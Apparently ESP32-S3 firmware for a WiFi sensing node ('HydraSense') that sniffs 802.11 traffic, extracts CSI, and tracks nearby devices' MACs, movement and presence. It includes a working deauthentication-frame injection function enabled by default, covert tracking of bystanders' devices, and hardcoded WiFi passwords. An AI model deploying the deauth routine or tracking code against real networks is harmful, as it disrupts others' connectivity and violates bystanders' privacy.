/**
 * ESP32-S3 WiFi Sensing Firmware - Primary Node
 * ==================================================
 * Advanced WiFi-based environment reconstruction using:
 * - CSI (Channel State Information) extraction
 * - Promiscuous packet sniffing with full metadata
 * - Channel hopping for comprehensive coverage
 * - Precise microsecond timestamping
 * - Multi-node synchronization support
 * - Real-time data streaming to host
 * 
 * This device acts as the primary sensing node and coordinator
 * for remote nodes performing triangulation.
 */

#include <Arduino.h>
#include <WiFi.h>
#include <SPIFFS.h>
#include <WebServer.h>
#include <ArduinoJson.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_system.h>
#include <esp_timer.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/queue.h>
#include <freertos/semphr.h>
#include <ESPmDNS.h>
#include <esp_task_wdt.h>
#include <Preferences.h>

// ============== Packet Injection Support ==============
// For network scanning (nmap-style) and packet injection
extern "C" {
  esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
}

// ============== Configuration ==============
// Configurable via NVS (use setConfig endpoint to change)
Preferences preferences;

// Primary WiFi network (STA mode) - connect to home network
char WIFI_SSID[33] = "samiam";
char WIFI_PASS[65] = "samiam1776";

// AP for remote sensors (AP+STA mode)
char AP_SSID[33] = "HydraSense";
char AP_PASS[65] = "hydra2026!";

const uint16_t HTTP_PORT = 80;
const uint16_t STREAM_PORT = 8080;
const char* MDNS_NAME = "hydrasense";  // hydrasense.local

// Watchdog timeout
const uint32_t WDT_TIMEOUT_S = 30;

// Channel hopping config
const uint8_t CHANNELS[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
const uint8_t NUM_CHANNELS = sizeof(CHANNELS) / sizeof(CHANNELS[0]);
const uint32_t CHANNEL_DWELL_MS = 100;  // Time per channel

// Data structures
#define MAX_DETECTIONS 500
#define MAX_REMOTES 8
#define CSI_DATA_LEN 128
#define MAX_TRACKED_MACS 64
#define RSSI_HISTORY_SIZE 24

// CSI extraction
static bool csi_enabled = true;
static int8_t last_csi_data[CSI_DATA_LEN];
static uint8_t last_csi_len = 0;
static uint64_t last_csi_ts = 0;
static uint8_t last_csi_mac[6];
static portMUX_TYPE csi_mux = portMUX_INITIALIZER_UNLOCKED;

// ============== Packet Injection Structures ==============
// For nmap-style network scanning and packet injection

// Deauthentication frame template
static uint8_t deauth_frame[] = {
  0xC0, 0x00,                          // Frame Control (deauth)
  0x00, 0x00,                          // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC (to be filled)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (to be filled)
  0x00, 0x00,                          // Sequence number
  0x07, 0x00                           // Reason code (Class 3 frame)
};

// Probe request frame template
static uint8_t probe_request[] = {
  0x40, 0x00,                          // Frame Control (probe request)
  0x00, 0x00,                          // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC (to be filled)
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID (broadcast)
  0x00, 0x00,                          // Sequence number
  // Tagged parameters follow
  0x00, 0x00,                          // SSID tag (wildcard)
  0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24,  // Supported rates
};

// Beacon frame template for network discovery
static uint8_t beacon_frame[] = {
  0x80, 0x00,                          // Frame Control (beacon)
  0x00, 0x00,                          // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
  0x00, 0x00,                          // Sequence number
  // Fixed parameters
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
  0x64, 0x00,                          // Beacon interval (100ms)
  0x31, 0x04,                          // Capability info
};

// Packet injection statistics
static uint32_t injected_deauths = 0;
static uint32_t injected_probes = 0;
static uint32_t injected_beacons = 0;
static bool injection_enabled = true;

// Network scan results storage
#define MAX_SCAN_RESULTS 50
struct NetworkScanResult {
  uint8_t bssid[6];
  char ssid[33];
  int8_t rssi;
  uint8_t channel;
  uint8_t encryption;  // 0=open, 1=WEP, 2=WPA, 3=WPA2, 4=WPA3
  uint64_t last_seen;
  uint32_t beacon_count;
  bool is_hidden;
  uint16_t clients_seen;
};
static NetworkScanResult scan_results[MAX_SCAN_RESULTS];
static int scan_result_count = 0;
static portMUX_TYPE scan_mux = portMUX_INITIALIZER_UNLOCKED;

// ============== Data Structures ==============

// MAC tracker for motion detection and direction estimation
struct MACTracker {
  uint8_t mac[6];
  int8_t rssi_history[RSSI_HISTORY_SIZE];
  uint64_t time_history[RSSI_HISTORY_SIZE];
  uint8_t history_idx;
  uint8_t sample_count;
  int32_t rssi_sum;
  int32_t rssi_sq_sum;
  uint64_t first_seen;
  uint64_t last_seen;
  uint16_t detection_count;
  bool is_moving;
  float rssi_velocity;      // dB/s
  int8_t direction_hint;    // -1=approaching, 0=static, 1=receding
  int8_t peak_rssi;
  int8_t min_rssi;
  
  // Device classification
  uint8_t device_type;      // 0=unknown, 1=phone, 2=laptop, 3=iot, 4=infra, 5=wearable
  float micro_variance;     // Sub-dB variance for breathing detection
  uint16_t frame_types_seen; // Bitmask of frame types
  float signal_quality;     // 0-1 consistency metric
  uint8_t burst_count;
  uint64_t last_burst_time;
  int8_t rssi_gradient;
  float presence_confidence;
};

// Device type constants
#define DEV_UNKNOWN 0
#define DEV_SMARTPHONE 1
#define DEV_LAPTOP 2
#define DEV_IOT 3
#define DEV_INFRASTRUCTURE 4
#define DEV_WEARABLE 5

struct __attribute__((packed)) WiFiDetection {
  uint64_t timestamp_us;      // Microsecond timestamp
  uint8_t mac[6];             // Source MAC address
  uint8_t bssid[6];           // BSSID
  int8_t rssi;                // Signal strength
  uint8_t channel;            // Channel number
  uint16_t frame_type;        // 802.11 frame type/subtype
  uint16_t seq_num;           // Sequence number
  uint8_t phy_mode;           // PHY mode (11b/g/n/ac)
  uint8_t bandwidth;          // Channel bandwidth
  int8_t noise_floor;         // Noise floor estimate
  uint8_t antenna;            // Antenna index (100+ = remote node)
  uint16_t data_rate;         // Data rate in 100kbps
  bool has_csi;               // CSI data available
  uint8_t csi_len;            // CSI data length
  int8_t csi_data[CSI_DATA_LEN]; // CSI amplitude data
};

struct RemoteNode {
  uint8_t mac[6];
  IPAddress ip;
  uint64_t last_seen;
  int8_t rssi_to_primary;
  bool active;
  String node_id;
};

struct EnvironmentSnapshot {
  uint64_t timestamp;
  uint16_t detection_count_val;
  uint8_t active_remotes;
  uint8_t current_channel;
  float estimated_occupancy;
};

// ============== Global State ==============

static WiFiDetection detections[MAX_DETECTIONS];
static uint16_t detection_head = 0;
static uint16_t detection_count_val = 0;
static portMUX_TYPE detection_mux = portMUX_INITIALIZER_UNLOCKED;

static RemoteNode remotes[MAX_REMOTES];
static uint8_t remote_count = 0;
static SemaphoreHandle_t remote_mux;

// MAC tracking for motion detection
static MACTracker mac_trackers[MAX_TRACKED_MACS];
static uint8_t tracker_count = 0;
static portMUX_TYPE tracker_mux = portMUX_INITIALIZER_UNLOCKED;
static uint16_t moving_count = 0;
static uint16_t approaching_count = 0;
static uint16_t receding_count = 0;

static uint8_t current_channel = 1;
static uint32_t total_packets = 0;
static uint32_t packets_per_second = 0;
static uint32_t last_packet_count = 0;
static uint64_t boot_time_us = 0;

static WebServer http_server(HTTP_PORT);
static WiFiServer stream_server(STREAM_PORT);
static WiFiClient stream_clients[4];
static uint8_t stream_client_count = 0;

static TaskHandle_t channel_hop_task = NULL;
static TaskHandle_t stats_task = NULL;
static TaskHandle_t stream_task = NULL;

// ============== Utility Functions ==============

String macToString(const uint8_t* mac) {
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

uint64_t getMicros64() {
  return esp_timer_get_time();
}

// ============== MAC Tracking ==============

MACTracker* getOrCreateTracker(const uint8_t* mac) {
  portENTER_CRITICAL(&tracker_mux);
  
  // Find existing
  for (int i = 0; i < tracker_count; i++) {
    if (memcmp(mac_trackers[i].mac, mac, 6) == 0) {
      portEXIT_CRITICAL(&tracker_mux);
      return &mac_trackers[i];
    }
  }
  
  // Create new if space
  if (tracker_count < MAX_TRACKED_MACS) {
    MACTracker* t = &mac_trackers[tracker_count++];
    memset(t, 0, sizeof(MACTracker));
    memcpy(t->mac, mac, 6);
    t->first_seen = getMicros64();
    portEXIT_CRITICAL(&tracker_mux);
    return t;
  }
  
  // Replace oldest
  int oldest = 0;
  uint64_t oldest_time = mac_trackers[0].last_seen;
  for (int i = 1; i < MAX_TRACKED_MACS; i++) {
    if (mac_trackers[i].last_seen < oldest_time) {
      oldest = i;
      oldest_time = mac_trackers[i].last_seen;
    }
  }
  
  MACTracker* t = &mac_trackers[oldest];
  memset(t, 0, sizeof(MACTracker));
  memcpy(t->mac, mac, 6);
  t->first_seen = getMicros64();
  portEXIT_CRITICAL(&tracker_mux);
  return t;
}

void updateTracker(MACTracker* t, int8_t rssi, uint16_t frame_type) {
  uint64_t now = getMicros64();
  
  t->rssi_history[t->history_idx] = rssi;
  t->time_history[t->history_idx] = now;
  t->history_idx = (t->history_idx + 1) % RSSI_HISTORY_SIZE;
  if (t->sample_count < RSSI_HISTORY_SIZE) t->sample_count++;
  
  t->rssi_sum += rssi;
  t->rssi_sq_sum += (int32_t)rssi * rssi;
  t->last_seen = now;
  t->detection_count++;
  
  // Track peak/min
  if (rssi > t->peak_rssi || t->peak_rssi == 0) t->peak_rssi = rssi;
  if (rssi < t->min_rssi || t->min_rssi == 0) t->min_rssi = rssi;
  
  // Track frame types for classification
  t->frame_types_seen |= (1 << (frame_type & 0x0F));
  
  // Burst detection
  if (now - t->last_burst_time < 100000) {
    t->burst_count++;
  } else {
    t->burst_count = 1;
  }
  t->last_burst_time = now;
  
  // Calculate variance and velocity
  if (t->sample_count >= 8) {
    float mean = (float)t->rssi_sum / t->sample_count;
    float variance = ((float)t->rssi_sq_sum / t->sample_count) - (mean * mean);
    t->is_moving = (variance > 12.0f);
    
    // RSSI velocity via linear regression
    if (t->sample_count >= 12) {
      float sum_t = 0, sum_r = 0, sum_tr = 0, sum_t2 = 0;
      int n = 0;
      int oldest_idx = (t->history_idx - t->sample_count + RSSI_HISTORY_SIZE) % RSSI_HISTORY_SIZE;
      uint64_t t0 = t->time_history[oldest_idx];
      
      for (int i = 0; i < 12; i++) {
        int idx = (t->history_idx - 12 + i + RSSI_HISTORY_SIZE) % RSSI_HISTORY_SIZE;
        float time_s = (float)(t->time_history[idx] - t0) / 1000000.0f;
        float r = (float)t->rssi_history[idx];
        sum_t += time_s;
        sum_r += r;
        sum_tr += time_s * r;
        sum_t2 += time_s * time_s;
        n++;
      }
      
      float denom = n * sum_t2 - sum_t * sum_t;
      if (denom > 0.001f) {
        t->rssi_velocity = (n * sum_tr - sum_t * sum_r) / denom;
        t->direction_hint = (t->rssi_velocity < -1.5f) ? -1 : (t->rssi_velocity > 1.5f) ? 1 : 0;
      }
      
      // Short-term gradient
      int idx_old = (t->history_idx - 4 + RSSI_HISTORY_SIZE) % RSSI_HISTORY_SIZE;
      int idx_new = (t->history_idx - 1 + RSSI_HISTORY_SIZE) % RSSI_HISTORY_SIZE;
      t->rssi_gradient = t->rssi_history[idx_new] - t->rssi_history[idx_old];
    }
    
    // Micro-variance for breathing detection
    if (t->sample_count >= 16) {
      float micro_sum = 0, micro_sq_sum = 0;
      for (int i = 0; i < 8; i++) {
        int idx = (t->history_idx - 8 + i + RSSI_HISTORY_SIZE) % RSSI_HISTORY_SIZE;
        float r = (float)t->rssi_history[idx];
        micro_sum += r;
        micro_sq_sum += r * r;
      }
      float micro_mean = micro_sum / 8.0f;
      t->micro_variance = (micro_sq_sum / 8.0f) - (micro_mean * micro_mean);
    }
    
    // Signal quality
    float range = (float)(t->peak_rssi - t->min_rssi);
    if (range < 1.0f) range = 1.0f;
    t->signal_quality = 1.0f - (variance / (range * range + 10.0f));
    if (t->signal_quality < 0) t->signal_quality = 0;
    if (t->signal_quality > 1) t->signal_quality = 1;
    
    // Presence confidence
    float duration = (float)(now - t->first_seen) / 1000000.0f;
    float age_factor = (duration > 10.0f) ? 1.0f : duration / 10.0f;
    t->presence_confidence = age_factor * (0.5f + 0.5f * t->signal_quality);
    
    // Device classification
    if (t->detection_count >= 10) {
      float rate = (float)t->detection_count / duration;
      
      if (t->signal_quality > 0.8f && !t->is_moving && t->micro_variance < 1.0f) {
        t->device_type = DEV_INFRASTRUCTURE;
      } else if (t->is_moving && t->burst_count > 3 && rate > 1.0f) {
        t->device_type = DEV_SMARTPHONE;
      } else if (rate > 5.0f && !t->is_moving) {
        t->device_type = DEV_LAPTOP;
      } else if (rate < 0.5f && !t->is_moving) {
        t->device_type = DEV_IOT;
      } else if (t->is_moving && rate < 2.0f && t->micro_variance > 0.5f) {
        t->device_type = DEV_WEARABLE;
      }
    }
  }
}

// ============== Packet Injection Functions ==============
// Network scanning and packet injection for authorized security testing

// Generate random MAC address for injection
void generateRandomMAC(uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = esp_random() & 0xFF;
  }
  mac[0] &= 0xFE;  // Clear multicast bit
  mac[0] |= 0x02;  // Set locally administered bit
}

// Send deauthentication frame (for security testing)
esp_err_t sendDeauth(uint8_t* target_mac, uint8_t* bssid, uint8_t channel, int count) {
  if (!injection_enabled) return ESP_ERR_INVALID_STATE;
  
  // Set channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  // Build deauth frame
  uint8_t frame[26];
  memcpy(frame, deauth_frame, sizeof(deauth_frame));
  
  // Set destination (target)
  memcpy(&frame[4], target_mac, 6);
  // Set source (BSSID)
  memcpy(&frame[10], bssid, 6);
  // Set BSSID
  memcpy(&frame[16], bssid, 6);
  
  esp_err_t result = ESP_OK;
  for (int i = 0; i < count && result == ESP_OK; i++) {
    result = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    if (result == ESP_OK) injected_deauths++;
    delayMicroseconds(500);
  }
  
  return result;
}

// Send probe request (for network discovery - nmap style)
esp_err_t sendProbeRequest(uint8_t channel, const char* ssid) {
  if (!injection_enabled) return ESP_ERR_INVALID_STATE;
  
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  // Build probe request
  uint8_t frame[128];
  memset(frame, 0, sizeof(frame));
  
  // Frame control
  frame[0] = 0x40;  // Probe request
  frame[1] = 0x00;
  
  // Duration
  frame[2] = 0x00;
  frame[3] = 0x00;
  
  // Destination (broadcast)
  memset(&frame[4], 0xFF, 6);
  
  // Source MAC (random)
  uint8_t src_mac[6];
  generateRandomMAC(src_mac);
  memcpy(&frame[10], src_mac, 6);
  
  // BSSID (broadcast)
  memset(&frame[16], 0xFF, 6);
  
  // Sequence number
  frame[22] = 0x00;
  frame[23] = 0x00;
  
  int offset = 24;
  
  // SSID element
  frame[offset++] = 0x00;  // Element ID
  if (ssid && strlen(ssid) > 0) {
    uint8_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    frame[offset++] = ssid_len;
    memcpy(&frame[offset], ssid, ssid_len);
    offset += ssid_len;
  } else {
    frame[offset++] = 0x00;  // Wildcard SSID
  }
  
  // Supported rates
  frame[offset++] = 0x01;  // Element ID
  frame[offset++] = 0x08;  // Length
  frame[offset++] = 0x82;
  frame[offset++] = 0x84;
  frame[offset++] = 0x8B;
  frame[offset++] = 0x96;
  frame[offset++] = 0x0C;
  frame[offset++] = 0x12;
  frame[offset++] = 0x18;
  frame[offset++] = 0x24;
  
  esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, frame, offset, false);
  if (result == ESP_OK) injected_probes++;
  
  return result;
}

// Broadcast probe on all channels (network scanner)
void probeAllChannels(const char* ssid) {
  for (int i = 0; i < NUM_CHANNELS; i++) {
    sendProbeRequest(CHANNELS[i], ssid);
    delay(20);
  }
}

// Parse and store beacon frame information
void parseBeaconFrame(const uint8_t* payload, int len, int8_t rssi, uint8_t channel) {
  if (len < 36) return;  // Minimum beacon frame size
  
  portENTER_CRITICAL(&scan_mux);
  
  // Extract BSSID (addr3)
  const uint8_t* bssid = &payload[16];
  
  // Find existing or create new entry
  int idx = -1;
  for (int i = 0; i < scan_result_count; i++) {
    if (memcmp(scan_results[i].bssid, bssid, 6) == 0) {
      idx = i;
      break;
    }
  }
  
  if (idx < 0 && scan_result_count < MAX_SCAN_RESULTS) {
    idx = scan_result_count++;
    memset(&scan_results[idx], 0, sizeof(NetworkScanResult));
    memcpy(scan_results[idx].bssid, bssid, 6);
  }
  
  if (idx >= 0) {
    scan_results[idx].rssi = rssi;
    scan_results[idx].channel = channel;
    scan_results[idx].last_seen = getMicros64();
    scan_results[idx].beacon_count++;
    
    // Parse tagged parameters starting at offset 36
    int offset = 36;
    while (offset + 2 < len) {
      uint8_t tag_id = payload[offset];
      uint8_t tag_len = payload[offset + 1];
      
      if (offset + 2 + tag_len > len) break;
      
      if (tag_id == 0) {  // SSID
        if (tag_len == 0) {
          scan_results[idx].is_hidden = true;
        } else {
          int copy_len = tag_len > 32 ? 32 : tag_len;
          memcpy(scan_results[idx].ssid, &payload[offset + 2], copy_len);
          scan_results[idx].ssid[copy_len] = '\0';
          scan_results[idx].is_hidden = false;
        }
      } else if (tag_id == 48 || tag_id == 221) {  // RSN or WPA
        scan_results[idx].encryption = 3;  // WPA2/WPA
      }
      
      offset += 2 + tag_len;
    }
  }
  
  portEXIT_CRITICAL(&scan_mux);
}

// ============== CSI Callback ==============

void csiCallback(void* ctx, wifi_csi_info_t* info) {
  if (!info || !info->buf || info->len == 0) return;
  
  portENTER_CRITICAL(&csi_mux);
  last_csi_len = min((int)info->len, CSI_DATA_LEN);
  memcpy(last_csi_data, info->buf, last_csi_len);
  memcpy(last_csi_mac, info->mac, 6);
  last_csi_ts = getMicros64();
  portEXIT_CRITICAL(&csi_mux);
}

void enableCSI() {
  wifi_csi_config_t csi_cfg = {
    .lltf_en = true,
    .htltf_en = true,
    .stbc_htltf2_en = true,
    .ltf_merge_en = true,
    .channel_filter_en = false,
    .manu_scale = false,
    .shift = 0,
  };
  
  esp_wifi_set_csi_config(&csi_cfg);
  esp_wifi_set_csi_rx_cb(csiCallback, NULL);
  esp_wifi_set_csi(true);
  csi_enabled = true;
  Serial.println("CSI extraction enabled");
}

void updateMotionStats() {
  portENTER_CRITICAL(&tracker_mux);
  moving_count = 0;
  approaching_count = 0;
  receding_count = 0;
  uint64_t cutoff = getMicros64() - 5000000;
  
  for (int i = 0; i < tracker_count; i++) {
    MACTracker& t = mac_trackers[i];
    if (t.last_seen > cutoff) {
      if (t.is_moving) moving_count++;
      if (t.direction_hint < 0) approaching_count++;
      else if (t.direction_hint > 0) receding_count++;
    }
  }
  portEXIT_CRITICAL(&tracker_mux);
}

// ============== Promiscuous Sniffer Callback ==============

void IRAM_ATTR promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!buf) return;
  
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  wifi_pkt_rx_ctrl_t* rx_ctrl = &pkt->rx_ctrl;
  
  // Skip invalid packets
  if (rx_ctrl->sig_len < 24) return;  // Minimum 802.11 header
  
  total_packets++;
  
  // Parse 802.11 header
  uint8_t* payload = pkt->payload;
  uint16_t frame_ctrl = payload[0] | (payload[1] << 8);
  uint8_t frame_type = (frame_ctrl >> 2) & 0x03;
  uint8_t frame_subtype = (frame_ctrl >> 4) & 0x0F;
  
  WiFiDetection det;
  memset(&det, 0, sizeof(det));
  
  det.timestamp_us = getMicros64();
  det.rssi = rx_ctrl->rssi;
  det.channel = rx_ctrl->channel;
  det.frame_type = (frame_type << 8) | frame_subtype;
  det.noise_floor = rx_ctrl->noise_floor;
  det.bandwidth = rx_ctrl->cwb;
  det.data_rate = rx_ctrl->rate;
  det.antenna = rx_ctrl->ant;
  det.has_csi = false;
  det.csi_len = 0;
  
  // Extract sequence number (bytes 22-23)
  if (rx_ctrl->sig_len >= 24) {
    det.seq_num = (payload[22] | (payload[23] << 8)) >> 4;
  }
  
  // Extract addresses based on frame type
  // Address 1: Destination (bytes 4-9)
  // Address 2: Source (bytes 10-15)
  // Address 3: BSSID (bytes 16-21)
  memcpy(det.mac, &payload[10], 6);   // Source MAC
  memcpy(det.bssid, &payload[16], 6); // BSSID
  
  // Store detection
  portENTER_CRITICAL(&detection_mux);
  uint16_t idx = detection_head;
  detection_head = (detection_head + 1) % MAX_DETECTIONS;
  if (detection_count_val < MAX_DETECTIONS) detection_count_val++;
  detections[idx] = det;
  portEXIT_CRITICAL(&detection_mux);
  
  // Update MAC tracker
  MACTracker* tracker = getOrCreateTracker(det.mac);
  if (tracker) {
    updateTracker(tracker, det.rssi, det.frame_type);
  }
}

// ============== Channel Hopping Task ==============

void channelHopTask(void* param) {
  uint8_t ch_idx = 0;
  
  while (true) {
    current_channel = CHANNELS[ch_idx];
    esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
    
    ch_idx = (ch_idx + 1) % NUM_CHANNELS;
    vTaskDelay(pdMS_TO_TICKS(CHANNEL_DWELL_MS));
  }
}

// ============== Statistics Task ==============

void statsTask(void* param) {
  while (true) {
    vTaskDelay(pdMS_TO_TICKS(1000));
    
    packets_per_second = total_packets - last_packet_count;
    last_packet_count = total_packets;
    
    // Update motion statistics
    updateMotionStats();
    
    // Clean up stale remote nodes
    uint64_t now = getMicros64();
    xSemaphoreTake(remote_mux, portMAX_DELAY);
    for (int i = 0; i < MAX_REMOTES; i++) {
      if (remotes[i].active && (now - remotes[i].last_seen) > 30000000) {
        remotes[i].active = false;
        remote_count--;
      }
    }
    xSemaphoreGive(remote_mux);
  }
}

// ============== Data Streaming Task ==============

void streamTask(void* param) {
  char buffer[4096];
  
  while (true) {
    vTaskDelay(pdMS_TO_TICKS(50));  // 20 Hz update rate
    
    // Accept new clients
    WiFiClient newClient = stream_server.accept();
    if (newClient) {
      for (int i = 0; i < 4; i++) {
        if (!stream_clients[i] || !stream_clients[i].connected()) {
          stream_clients[i] = newClient;
          stream_client_count++;
          Serial.printf("Stream client %d connected\n", i);
          break;
        }
      }
    }
    
    // Build detection snapshot as JSON
    JsonDocument doc;
    doc["ts"] = getMicros64();
    doc["ch"] = current_channel;
    doc["pps"] = packets_per_second;
    doc["total"] = total_packets;
    doc["remotes"] = remote_count;
    
    JsonArray dets = doc["d"].to<JsonArray>();
    
    portENTER_CRITICAL(&detection_mux);
    uint16_t count = ((detection_count_val < 20) ? detection_count_val : 20);  // Send up to 20 per frame
    uint16_t start = (detection_head - count + MAX_DETECTIONS) % MAX_DETECTIONS;
    
    for (uint16_t i = 0; i < count; i++) {
      uint16_t idx = (start + i) % MAX_DETECTIONS;
      WiFiDetection& d = detections[idx];
      
      JsonObject det = dets.add<JsonObject>();
      det["t"] = d.timestamp_us;
      det["m"] = macToString(d.mac);
      det["r"] = d.rssi;
      det["c"] = d.channel;
      det["f"] = d.frame_type;
      det["n"] = d.noise_floor;
      det["s"] = d.seq_num;
      
      if (d.has_csi && d.csi_len > 0) {
        JsonArray csi = det["csi"].to<JsonArray>();
        for (int j = 0; j < min((int)d.csi_len, 32); j++) {
          csi.add(d.csi_data[j]);
        }
      }
    }
    portEXIT_CRITICAL(&detection_mux);
    
    // Add remote node data for triangulation
    JsonArray rems = doc["r"].to<JsonArray>();
    xSemaphoreTake(remote_mux, portMAX_DELAY);
    for (int i = 0; i < MAX_REMOTES; i++) {
      if (remotes[i].active) {
        JsonObject rem = rems.add<JsonObject>();
        rem["id"] = remotes[i].node_id;
        rem["ip"] = remotes[i].ip.toString();
        rem["rssi"] = remotes[i].rssi_to_primary;
        rem["seen"] = remotes[i].last_seen;
      }
    }
    xSemaphoreGive(remote_mux);
    
    size_t len = serializeJson(doc, buffer, sizeof(buffer));
    
    // Send to all connected clients
    for (int i = 0; i < 4; i++) {
      if (stream_clients[i] && stream_clients[i].connected()) {
        stream_clients[i].write((uint8_t*)buffer, len);
        stream_clients[i].write('\n');
      }
    }
  }
}

// ============== HTTP Handlers ==============

void handleRoot() {
  String html = R"(
<!DOCTYPE html>
<html><head><title>HydraSense Primary Node</title>
<style>
body { font-family: monospace; background: #0a0f1a; color: #00ff88; padding: 20px; }
.stat { margin: 10px 0; padding: 10px; background: #1a2744; border-radius: 8px; }
h1 { color: #1e8fff; }
</style></head><body>
<h1>🛰️ HydraSense Primary Node</h1>
<div class="stat">Packets/sec: <span id="pps">0</span></div>
<div class="stat">Total Packets: <span id="total">0</span></div>
<div class="stat">Current Channel: <span id="ch">0</span></div>
<div class="stat">Detection Buffer: <span id="det">0</span></div>
<div class="stat">Remote Nodes: <span id="rem">0</span></div>
<h2>Endpoints</h2>
<ul>
<li>GET /scan - JSON detection data</li>
<li>GET /status - System status</li>
<li>GET /remotes - Remote node list</li>
<li>POST /remote_data - Receive data from remote nodes</li>
<li>GET /firmware.bin - OTA firmware for remotes</li>
<li>TCP :8080 - Real-time JSON stream</li>
</ul>
<script>
setInterval(async () => {
  const r = await fetch('/status');
  const d = await r.json();
  document.getElementById('pps').textContent = d.pps;
  document.getElementById('total').textContent = d.total;
  document.getElementById('ch').textContent = d.channel;
  document.getElementById('det').textContent = d.detections;
  document.getElementById('rem').textContent = d.remotes;
}, 1000);
</script>
</body></html>
)";
  http_server.send(200, "text/html", html);
}

void handleStatus() {
  JsonDocument doc;
  doc["uptime_ms"] = millis();
  doc["pps"] = packets_per_second;
  doc["total"] = total_packets;
  doc["channel"] = current_channel;
  doc["detections"] = detection_count_val;
  doc["remotes"] = remote_count;
  doc["heap_free"] = ESP.getFreeHeap();
  doc["ap_ip"] = WiFi.softAPIP().toString();
  doc["sta_ip"] = WiFi.localIP().toString();
  doc["sta_connected"] = (WiFi.status() == WL_CONNECTED);
  doc["ssid"] = WIFI_SSID;
  
  String output;
  serializeJson(doc, output);
  http_server.send(200, "application/json", output);
}

void handleScan() {
  JsonDocument doc;
  doc["ts"] = getMicros64();
  doc["channel"] = current_channel;
  doc["moving"] = moving_count;
  doc["approaching"] = approaching_count;
  doc["receding"] = receding_count;
  doc["tracked"] = tracker_count;
  
  JsonArray dets = doc["detections"].to<JsonArray>();
  
  portENTER_CRITICAL(&detection_mux);
  uint16_t count = ((detection_count_val < 100) ? detection_count_val : 100);
  uint16_t start = (detection_head - count + MAX_DETECTIONS) % MAX_DETECTIONS;
  
  for (uint16_t i = 0; i < count; i++) {
    uint16_t idx = (start + i) % MAX_DETECTIONS;
    WiFiDetection& d = detections[idx];
    
    JsonObject det = dets.add<JsonObject>();
    det["timestamp_us"] = d.timestamp_us;
    det["mac"] = macToString(d.mac);
    det["bssid"] = macToString(d.bssid);
    det["rssi"] = d.rssi;
    det["channel"] = d.channel;
    det["frame_type"] = d.frame_type;
    det["seq_num"] = d.seq_num;
    det["noise_floor"] = d.noise_floor;
    det["bandwidth"] = d.bandwidth;
    det["data_rate"] = d.data_rate;
    det["source"] = d.antenna >= 100 ? "remote" : "local";
    
    // Add motion data from tracker
    MACTracker* t = getOrCreateTracker(d.mac);
    if (t && t->sample_count >= 8) {
      det["mv"] = t->is_moving ? 1 : 0;
      det["dir"] = t->direction_hint;
      if (t->sample_count >= 12) {
        det["vel"] = (int)(t->rssi_velocity * 10) / 10.0f;
      }
    }
    
    if (d.has_csi && d.csi_len > 0) {
      JsonArray csi = det["csi"].to<JsonArray>();
      for (int j = 0; j < d.csi_len; j++) {
        csi.add(d.csi_data[j]);
      }
    }
  }
  portEXIT_CRITICAL(&detection_mux);
  
  // Add tracked MAC summary
  JsonArray trackedArr = doc["tracked_macs"].to<JsonArray>();
  portENTER_CRITICAL(&tracker_mux);
  uint64_t cutoff = getMicros64() - 10000000;
  int added = 0;
  for (int i = 0; i < tracker_count && added < 25; i++) {
    MACTracker& t = mac_trackers[i];
    if (t.last_seen > cutoff && t.sample_count >= 4) {
      JsonObject tr = trackedArr.add<JsonObject>();
      tr["mac"] = macToString(t.mac);
      tr["cnt"] = t.detection_count;
      tr["mv"] = t.is_moving ? 1 : 0;
      tr["dir"] = t.direction_hint;
      if (t.sample_count >= 12) {
        tr["vel"] = (int)(t.rssi_velocity * 10) / 10.0f;
      }
      tr["peak"] = t.peak_rssi;
      tr["min"] = t.min_rssi;
      
      // Average RSSI
      if (t.sample_count > 0) {
        int sum = 0;
        for (int j = 0; j < t.sample_count && j < RSSI_HISTORY_SIZE; j++) {
          sum += t.rssi_history[j];
        }
        tr["rssi"] = sum / t.sample_count;
      }
      
      // New device classification fields
      tr["dev_type"] = t.device_type;
      tr["quality"] = (int)(t.signal_quality * 100);
      tr["conf"] = (int)(t.presence_confidence * 100);
      tr["micro_var"] = (int)(t.micro_variance * 10) / 10.0f;
      tr["gradient"] = t.rssi_gradient;
      
      added++;
    }
  }
  portEXIT_CRITICAL(&tracker_mux);
  
  String output;
  serializeJson(doc, output);
  http_server.send(200, "application/json", output);
}

void handleRemotes() {
  JsonDocument doc;
  JsonArray arr = doc["remotes"].to<JsonArray>();
  
  xSemaphoreTake(remote_mux, portMAX_DELAY);
  for (int i = 0; i < MAX_REMOTES; i++) {
    if (remotes[i].active) {
      JsonObject rem = arr.add<JsonObject>();
      rem["node_id"] = remotes[i].node_id;
      rem["mac"] = macToString(remotes[i].mac);
